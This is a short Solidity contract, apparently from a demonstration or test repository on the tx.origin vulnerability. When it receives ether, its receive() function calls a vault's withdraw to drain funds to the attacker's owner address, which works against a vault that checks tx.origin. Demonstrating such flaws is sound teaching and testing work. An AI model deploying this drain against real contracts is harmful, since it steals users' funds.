// .src/TxOrigin/AttackingContract.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import "../../node_modules/@openzeppelin/contracts/access/Ownable.sol";
import "../Interfaces/IVault.sol";

contract AttackingContract is Ownable {
    IVault private immutable vault;

    constructor(address _vaultAddress) Ownable(msg.sender) {
        vault = IVault(_vaultAddress);
    }

    receive() external payable {
        vault.withdraw(owner());
    }
}
